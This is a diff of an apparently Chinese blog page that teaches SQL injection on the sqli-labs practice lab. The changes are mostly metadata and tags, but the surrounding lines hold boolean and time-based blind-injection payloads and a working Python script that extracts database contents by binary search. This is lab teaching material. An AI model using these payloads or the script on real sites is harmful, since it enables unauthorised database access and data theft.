@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://sn1per-ssd.github.io/jie/img-20210303194309.png">
 <meta property="og:image" content="https://sn1per-ssd.github.io/jie/img-20210303195819.png">
 <meta property="article:published_time" content="2019-07-17T16:00:00.000Z">
-<meta property="article:modified_time" content="2021-03-06T03:51:40.371Z">
+<meta property="article:modified_time" content="2021-05-09T09:00:48.231Z">
 <meta property="article:author" content="Sn1pEr">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -352,7 +352,7 @@ var _hmt = _hmt || [];
 <p>方法二：<code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;1 --+</code>，修改limit来得到其他字母的ASCII码。<br>猜列名等于上面一致就不一一列举了。</p>
 <p>写的布尔盲注脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.233.129/sqli-labs/Less-8/?id=1&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    left = <span class="number">48</span></span><br><span class="line">    right = <span class="number">122</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left&lt;right:</span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; and (ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;.format(i,mid) #读数据库名，security</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;.format(i,mid) #读第一个表名,emails</span></span><br><span class="line">        <span class="comment"># payload = &quot;&#x27; and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;referers&#x27; limit 0,1),&#123;&#125;,2))&gt;&#123;&#125;)--+&quot;.format(i,mid)#查看第一行,id</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; and (ascii(substr((select id from emails limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,mid)<span class="comment">#查看第一个字段，1</span></span><br><span class="line">        url1 = url+payload</span><br><span class="line">        source = requests.get(url=url1)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> source.text):</span><br><span class="line">            left = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> (<span class="string">&quot;You are in...........&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> source.text):</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">elif</span> source.status_code==<span class="number">429</span>:</span><br><span class="line">            print(<span class="string">&quot;too fast&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        mid = left + ((right - left) &gt;&gt; <span class="number">1</span>) <span class="comment">#二分法查找</span></span><br><span class="line">        <span class="keyword">if</span>(mid==<span class="number">48</span>|mid==<span class="number">122</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">str</span>+<span class="built_in">chr</span>(mid)</span><br><span class="line">    print(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>与上面相同，利用程序执行返回的正确与错误信息来进行注入，首先，通过if语句、length语句和sleep语句猜测出数据库名的长度<code>?id=1&#39; and if(length(database())&gt;10 ,sleep(10), 1) %23</code><br>然后就和上面盲注的步骤一样了</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>与上面相同，利用程序执行返回的正确与错误信息来进行注入，首先，通过if语句、length语句和sleep语句猜测出数据库名的长度<code>?id=1&#39; and if(length(database())&gt;10,sleep(10),1) %23</code><br>然后就和上面盲注的步骤一样了</p>
 <p>时间盲注的脚本和上面差不多，获取时间然后相减再对sleep的参数进行比较就行了。</p>
 <h1 id="部分简单绕过技巧"><a href="#部分简单绕过技巧" class="headerlink" title="部分简单绕过技巧"></a>部分简单绕过技巧</h1><p>只把网上能看见的简单的记下来</p>
 <ol>
@@ -721,6 +721,18 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">nmap</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">phpcms</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">phpmyadmin</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -729,15 +741,35 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶机</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color4">端口号</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">面试题</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -758,22 +790,6 @@ gitalk.render('gitalk-container')
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">phpstudy</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">端口号</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">phpcms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">面试题</a>
               </li>
             
             <div class="clearfix"></div>
